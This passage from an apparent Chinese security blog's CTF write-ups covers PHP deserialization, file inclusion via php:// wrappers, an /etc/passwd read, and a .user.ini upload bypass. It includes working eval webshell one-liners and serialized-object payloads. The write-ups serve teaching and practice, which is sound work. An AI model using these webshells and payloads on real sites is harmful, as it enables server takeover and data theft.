class="line">$aa=new mylogin();</span><br><span class="line">$aa-&gt;user=&quot;daydream&quot;;</span><br><span class="line">$aa-&gt;pass=&quot;ok&quot;;</span><br><span class="line">$s=serialize($aa);</span><br><span class="line">print_r()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<p>?param=O:7:”mylogin”:2:{s:4:”user”;s:8:”daydream”;s:4:”pass”;s:2:”ok”;}</p>
<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_COOKIE[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>和上一题的payload一样，不过把param后面的值进行url编码</p>
<p>![img]1671089842139-0a4d683f-f080-41bb-a5dd-22e61914c88e.png)</p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>php中四个可文件包含的函数</title>
    <url>/2023/01/07/php%E4%B8%AD%E5%9B%9B%E4%B8%AA%E5%8F%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<h1 id="一、文件包含漏洞分类"><a href="#一、文件包含漏洞分类" class="headerlink" title="一、文件包含漏洞分类"></a>一、文件包含漏洞分类</h1><p>LFI(Local File Inclusion)<br><strong>本地文件包含漏洞</strong>，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。<br>为了方便本文把LFI直接称为文件包含漏洞。</p>
<span id="more"></span>

<p>RFI(Remote File Inclusion)<br><strong>远程文件包含漏洞</strong>。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
<p>allow_url_fopen = On allow_url_include = On </p>
<p>两个配置选项均需要为On，才能远程包含文件成功。<br>在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。</p>
<h1 id="二、文件包含漏洞原理"><a href="#二、文件包含漏洞原理" class="headerlink" title="二、文件包含漏洞原理"></a>二、文件包含漏洞原理</h1><p>本地文件包含（Local File Inclusion）漏洞，是程序员在网站设计中，为方便自己在设计构架时，使用了一些包含的函数，在文件中包含一个文件。</p>
<p>服务器执行PHP文件时，可以通过<strong>文件包含函数</strong>加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。</p>
<p>这意味着可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，只更新一个包含文件就可以了，或者当向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p>
<p>LFI 产生的原因是由于程序员未对<strong>用户可控变量</strong>进行输入检查，此漏洞的影响可能导致泄露服务器上的敏感文件等。<br>如若攻击者能够通过其他方式在Web服务器上放置代码，那么他们便可以执行任意命令</p>
<p> Directory traversal attack is also called a Local File Inclusion or LFI. </p>
<p>翻译：<strong>目录遍历攻击</strong>也称为<strong>本地文件包含攻击</strong>或<strong>LFI</strong>。</p>
<h1 id="三、文件包含函数"><a href="#三、文件包含函数" class="headerlink" title="三、文件包含函数"></a>三、文件包含函数</h1><p>PHP中文件包含函数有以下四种：</p>
<p>require() // 只在执行到此函数时才去包含文件，若包含的文件不存在产生警告，程序继续运行</p>
<p>require_once() // 如果一个文件已经被包含过，则不会在包含它</p>
<p>include() // 程序一运行文件便会包含进来，若包含文件不存在产生致命错误，程序终止运行</p>
<p>include_once() // 如果一个文件已经被包含过，则不会在包含它</p>
<p>include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序<strong>继续正常运行</strong>；<br>而require函数出现错误的时候，会直接<strong>报错并退出</strong>程序的执行。</p>
<p>而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数<strong>只包含一次</strong>，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
<p>这四个函数可以将任意类型的文件当做 PHP 文件进行解析。<br>示例代码：</p>
<?php     $filename  = $_GET['filename']; // 存在可控变量     include($filename); // 存在动态变量 ?><p>例如：</p>
<p>$_GET[‘filename’]参数开发者没有经过严格的过滤，直接带入了include的函数，<br>攻击者可以修改<br>$_GET[‘filename’]的<strong>值</strong>，执行非预期的操作。</p>
<h1 id="四、测试是否存在本地文件包含（LFI）漏洞"><a href="#四、测试是否存在本地文件包含（LFI）漏洞" class="headerlink" title="四、测试是否存在本地文件包含（LFI）漏洞"></a>四、测试是否存在本地文件包含（LFI）漏洞</h1><p>使用 …/ 上一级目录测试：</p>
<p>?page=../ </p>
<p>会返回以下错误：</p>
<p>Warning: include(C:\Users\Administrator\Documents\php): failed to open stream: Permission denied in C:\Users\Administrator\Documents\php\LFI\LFI_base.php on line 10 </p>
<p>这意味着很有可能存在 LFI 漏洞</p>
<p>使用 常见 页面</p>
<p>?page=index.html </p>
<p>若是返回 index.html 页面，也就意味着存在 LFI 漏洞</p>
<p>直接读取 /etc/passwd 文件(Linux)：</p>
<p>?page=/etc/passwd </p>
<p>若是出现了 passwd 数据，那证明此网站容易受到本地文件包含的影响</p>
]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>(php伪协议/反序列化)[ZJCTF 2019]NiZhuanSiWei</title>
    <url>/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ZJCTF-2019-NiZhuanSiWei/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$text = $_GET[&quot;text&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$password = $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;&lt;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))</span><br><span class="line">这个判断告诉我们要将text内写入welcome to the zjctf</span><br></pre></td></tr></table></figure>

<p>payload:     ?text=data:text/plain,welcome to the zjctf</p>
<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ZJCTF-2019-NiZhuanSiWei/1671075372596-f2fa5db8-d5f4-48e6-a5a2-b1b4e4bdf590.png" alt="img"></p>
<h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&quot;/flag/&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>file参数里不能出现flag字符，我们看到提示“useless.php ”，先包含它看一下。（因为是php文件，我们想看到内容就需要php://filter伪协议）</strong></p>
<p><strong>payload：</strong>    ?text=data:text/plain,welcome to the zjctf&amp;file=php://filter/convert.base64-encode/resource=useless.php</p>
<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ZJCTF-2019-NiZhuanSiWei/1671075461187-32dcfb9f-cd9b-44f0-81d7-f0f42f69ef26.png" alt="img"></p>
<p>base64解码</p>
<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ZJCTF-2019-NiZhuanSiWei/1671075473876-972200a1-a00b-44df-a107-58a72b1a6f67.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>

<p>这里定义了Flag类，里面有__tostring魔术方法，这个魔术方法是在类被当成字符串的时候调用，然后获取file的值并输出。而且这里也提醒了我们flag.php。</p>
<h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$password = unserialize($password);</span><br><span class="line">echo $password;</span><br></pre></td></tr></table></figure>

<p><strong>那么现在我们就包含useless.php文件，后面对$password进行了反序列化，我们让$password反序列化出Flag类，因为$password被当做字符串输出，所以会调用__tostring魔术方法，然后会输出file的内容。那么我们就构造反序列化的值</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line">    public $file=&quot;flag.php&quot;;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a = new Flag();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ZJCTF-2019-NiZhuanSiWei/1671075712120-d14a4c6d-5a5b-48d6-996e-33bbeca45956.png" alt="img"></p>
<p>这样也行</p>
<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ZJCTF-2019-NiZhuanSiWei/1671076151088-7145357a-d162-40dd-9eb7-f8eb6cd6d718.png" alt="img"></p>
<p>最终payload</p>
<p>/?text=data:text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-ZJCTF-2019-NiZhuanSiWei/1671075858686-3674cdfa-c3ac-43e6-87d0-c1df8397895e.png" alt="img"></p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>php伪协议</title>
    <url>/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1671075085334-f8db25b9-a34c-4389-bcc8-456136aa10b3.png" alt="img"></p>
<span id="more"></span>

<p><a href="https://www.cnblogs.com/zzjdbk/p/13030717.html">https://www.cnblogs.com/zzjdbk/p/13030717.html</a></p>
<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。<br>用法：?file=php://input 数据利用POST传过去</p>
<h2 id="php-input-（读取POST数据）"><a href="#php-input-（读取POST数据）" class="headerlink" title="php://input （读取POST数据）"></a>php://input （读取POST数据）</h2><p>碰到file_get_contents()就要想到用php://input绕过，因为php伪 也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
<p>通过input获取webshell<br>写入一句话木马<?PHP fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd])?>‘);?&gt;</p>
<p>这句话的意思就是把<?php @eval($_POST[cmd])?> 写入shell.php文件内</p>
<h2 id="phar伪协议"><a href="#phar伪协议" class="headerlink" title="phar伪协议"></a>phar伪协议</h2><p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985517502-8a69e911-3940-44ac-ba57-3d9da4d9357c.png" alt="img"></p>
<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985533813-9ec7942b-c948-4f4e-95a2-9d88077040a1.png" alt="img"></p>
<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985642874-68dc50ef-5eaa-41c1-b524-521e956fa458.png" alt="img"></p>
<h2 id="zip伪协议"><a href="#zip伪协议" class="headerlink" title="zip伪协议"></a>zip伪协议</h2><p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985545426-183eb807-c399-45f5-9f46-a970ba1aa748.png" alt="img"></p>
<p><img src="/2023/01/07/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/1672985621872-439b3aed-aa5b-4b67-a199-a1d3e95c3f4d.png" alt="img"></p>
]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>(private私有反序列化)[极客大挑战 2019]PHP</title>
    <url>/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/</url>
    <content><![CDATA[<p><img src="/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1671589654129-abe73843-e387-480b-9967-47bf36e15a3e.png" alt="img"></p>
<span id="more"></span>

<p><img src="/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1671589674756-71cd31d2-7107-41cd-9bc5-782ddf90624c.png" alt="img"></p>
<p>给了提示：备份网站</p>
<p>扫目录得到<a href="http://www.zip/">www.zip</a></p>
<p><img src="/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1671589710907-75674e7f-d840-4b39-b723-ac0b98ee7e17.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">​    public function __construct($username,$password)&#123;</span><br><span class="line">​        $this-&gt;username = $username;</span><br><span class="line">​        $this-&gt;password = $password;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    function __wakeup()&#123;</span><br><span class="line">​        $this-&gt;username = &#x27;guest&#x27;;</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    function __destruct()&#123;</span><br><span class="line">​        if ($this-&gt;password != 100) &#123;</span><br><span class="line">​            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;</span><br><span class="line">​            echo &quot;You name is: &quot;;</span><br><span class="line">​            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">​            echo &quot;You password is: &quot;;</span><br><span class="line">​            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">​            die();</span><br><span class="line">​        &#125;</span><br><span class="line">​        if ($this-&gt;username === &#x27;admin&#x27;) &#123;</span><br><span class="line">​            global $flag;</span><br><span class="line">​            echo $flag;</span><br><span class="line">​        &#125;else&#123;</span><br><span class="line">​            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;;</span><br><span class="line">​            die();</span><br><span class="line"></span><br><span class="line">​            </span><br><span class="line">​        &#125;</span><br><span class="line">​    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &#x27;Syc&#123;dog_dog_dog_dog&#125;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>上面三个php文件，其中flag.php没有用，纯粹迷惑你。</p>
<p>看index.php中间的几行代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  &lt;?php</span><br><span class="line"></span><br><span class="line">​    include &#x27;class.php&#x27;;</span><br><span class="line"></span><br><span class="line">​    $select = $_GET[&#x27;select&#x27;];</span><br><span class="line"></span><br><span class="line">​    $res=unserialize(@$select);</span><br><span class="line"></span><br><span class="line">​    ?&gt;</span><br></pre></td></tr></table></figure>

<p>这里是包含了class.php，并且get传参select，将传入的内容反序列化</p>
<p>所以我们要将闯入的内容序列化</p>
<p>看class.php</p>
<p>在这段代码的__destruct()方法中，发现了输出flag的代码，并且，<strong>执行条件是password==100，username===‘admin’</strong>。</p>
<p>接下来，就有考虑如何调用__destruct()方法了，这就用到了index.php中的<strong>反序列操作</strong>。</p>
<p>可以将序列化的Name对象作为select参数的值提交。当执行反序列化之后，又恢复成Name对象，并且，在Name对象销毁时，会自动调用__destruct()方法。</p>
<p>当时这里用个问题，就是在执行__destruct()方法之前，可能会先执行wakeup()方法，并且在**wakeup()**<strong>会修改username的值</strong>。</p>
<p>因此，这里<strong>应该绕过wakeup()方法</strong>，避免wakeup()执行。</p>
<p>这里存在一个<strong>CVE漏洞</strong>：<strong>当成员属性数目大于实际数目时可绕过wakeup方法</strong></p>
<p>（1）通过php脚本，将serialize($a)函数序列化的结果输出。<strong>脚本生成php序列化对象参考代码如下：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username = &#x27;nonono&#x27;;</span><br><span class="line">    private $password = &#x27;yesyes&#x27;;</span><br><span class="line"></span><br><span class="line">​    public function __construct($username,$password)&#123;</span><br><span class="line">​        $this-&gt;username = $username;</span><br><span class="line">​        $this-&gt;password = $password;</span><br><span class="line">​    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Name(&#x27;admin&#x27;, 100);</span><br><span class="line">var_dump(serialize($a));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1671590041461-ed36aa06-0dc6-43e9-9d6e-156fa697e250.png" alt="img"></p>
<p>另外，<strong>private 声明的字段在序列化时，需要注意</strong>：</p>
<ul>
<li>private声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。</li>
<li>因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0（即%00）的前缀。字符串长度也包括所加前缀的长度，如下</li>
</ul>
<p>O:4:”User”:2:{s:9:”%00User%00age”;i:20;s:10:”%00User%00name”;s:4:”daye”;}   # 9=7+2  10=8+2  其中2为两个前缀</p>
<p>(2)也可以直接构造</p>
<blockquote>
<?php
class Name{
private $username = 'admin';
private $password = '100';#这里也可以换成数字100
}
$name = new Name;
print(serialize($name));
?>
</blockquote>
<p>最后序列化结果为</p>
<blockquote>
<p>O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}</p>
</blockquote>
<p>其中的3是为了绕过_wakeup()魔法函数将2改成了3</p>
<p>最后payload</p>
<p>?select=O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}</p>
<p><img src="/2023/01/07/private%E7%A7%81%E6%9C%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/1671590395019-d117697c-b848-41ab-b430-c4fdaf8514d8.png" alt="img"></p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>(.user.ini+GIF89a+script一句话木马)[SUCTF 2019]CheckIn</title>
    <url>/2023/01/07/user-ini-GIF89a-script%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-SUCTF-2019-CheckIn/</url>
    <content><![CDATA[<p><img src="/2023/01/07/user-ini-GIF89a-script%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-SUCTF-2019-CheckIn/1671711680046-9b221109-2797-4f54-b053-1be9a4ffe473.png" alt="img"></p>
<span id="more"></span>

<p><img src="/2023/01/07/user-ini-GIF89a-script%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-SUCTF-2019-CheckIn/1671711696524-9fcf6285-d3cf-4271-9ecc-c84e31fff624.png" alt="img"></p>
<h2 id="1、首先上传了一个php文件"><a href="#1、首先上传了一个php文件" class="headerlink" title="1、首先上传了一个php文件"></a>1、首先上传了一个php文件</h2><p>给了俩单词</p>
<p><img src="/2023/01/07/user-ini-GIF89a-script%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-SUCTF-2019-CheckIn/1671711737667-3b8b6cac-e845-4652-bb94-32b4f6b5a397.png" alt="img"></p>
<p>就是不能传这些后缀的文件了</p>
<h2 id="2、那再试试改后缀"><a href="#2、那再试试改后缀" class="headerlink" title="2、那再试试改后缀"></a>2、那再试试改后缀</h2><p><img src="/2023/01/07/user-ini-GIF89a-script%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-SUCTF-2019-CheckIn/1671711784985-12c5cabb-5c4c-48e6-9e9c-1bd5f4addc48.png" alt="img"></p>
<?被ban了  

只能换一种一句话木马了

<script language="php">eval($_GET['cmd']);

可是上传了还没有路径

![img](1671712059006-fbe12ac7-7858-4e7a-a3c0-71d6d1205c16.png)

![img](1671712081478-243be4ee-13e6-458d-8f49-a233f0266e85.png)

说明题目后端会截取上传的文件的头部一部分进行判断是否为图像文件

所以加上图片的文件头   

GIF89a?

<script language="php">eval($_GET['cmd']);</script>

![img](1671712249459-0e90d8f2-22d8-4c5b-8c90-54364bebb36e.png)

ok上传成功

现在我们已将图片马上传上去了。

但是图片马上传上去只是进行了一半，因为时图片马，不是php脚本文件，所以无法被解析运行。所以就需要进行**重头戏：文件包含漏洞**    

## 3、上传.user.ini文件

GIF89a

auto_prepend_file=gif89+script.jpg

**payload:**/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php?cmd=phpinfo();

![img](1671712510297-b1294803-282f-4e82-a396-f6e6ee7fca56.png)

试了一下可以包含

直接找flag

![img](1671712657532-a92ccc74-6c70-45b2-942f-fb97117f7b1b.png)

flag{1bf8116f-15b3-4dfc-82f6-8df397cdfc4c}

## 参考

https://blog.csdn.net/weixin_39190897/article/details/86772765

https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
      <categories>
        <category>文件上传</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>windows与linux敏感文件</title>
    <url>/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p><img src="/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/1672907473922-2aa73c09-d061-4481-8442-63c24e067253.png" alt="img"></p>
<span id="more"></span>

<p><img src="/2023/01/07/windows%E4%B8%8Elinux%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/1672907506267-4bbdfa60-5874-4a19-87ea-85760bd1fff9.png" alt="img"></p>
]]></content>
      <categories>
        <category>文件包含</category>
      </categories>
      <tags>
        <tag>web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>一道反序列化</title>
    <url>/2023/01/07/%E4%B8%80%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p><img src="/2023/01/07/%E4%B8%80%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1670059317609-fcb0c167-5a82-4039-9a87-7fafc8dfa89f.png" alt="img"></p>
<span id="more"></span>

<p>打开一看啥也没有，看看源码</p>
<p><img src="/2023/01/07/%E4%B8%80%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1670059338208-69950874-ac17-49a4-9527-12fa0dcbcdc0.png" alt="img"></p>
<p>根据以上源码泄露，是文件包含漏洞，配合封装协议读取文件源码</p>
<p>包含了class.php文件。</p>
<p>这里得讲到file_get_contents()函数</p>
<p>file_get_contents() 函数把整个文件读入一个字符串中。</p>
<p>这里的字符串是$user参数接受的，利用它的文件封装协议来读取$file参数include的文件</p>
<p>当然这里要使第一个条件成立。还需要讲到一个文件封装协议</p>
<p>php://input 是个可以访问请求的原始数据的只读流</p>
<p>第一个条件：</p>
<p>if(isset($user)&amp;&amp;(file_get_contents($user,’r’)===”admin”))</p>
<p>使$user的值等于admin，并且使$user接收读入的文件</p>
<p>可利用php://input绕过</p>
<p><img src="/2023/01/07/%E4%B8%80%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1670059842048-877fe8d0-29d2-4f0e-a0e3-d1b65ec48073.png" alt="img"></p>
<p>成功绕过</p>
<p>现在利用php伪协议读取class.php源码，格式为base64加密</p>
<p><img src="/2023/01/07/%E4%B8%80%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1670059938564-c4bd1ee4-9791-4770-95c5-00d768345a27.png" alt="img"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL &amp; ~E_NOTICE);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;__toString was called!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们构造反序列化的参数：<br>O:4:”Read”:1:{s:4:”file”;s:57:”php://filter/read=convert.base64-encode/resource=f1a9.php”;}</p>
<p>这里也是利用php://filter来读取flag文件</p>
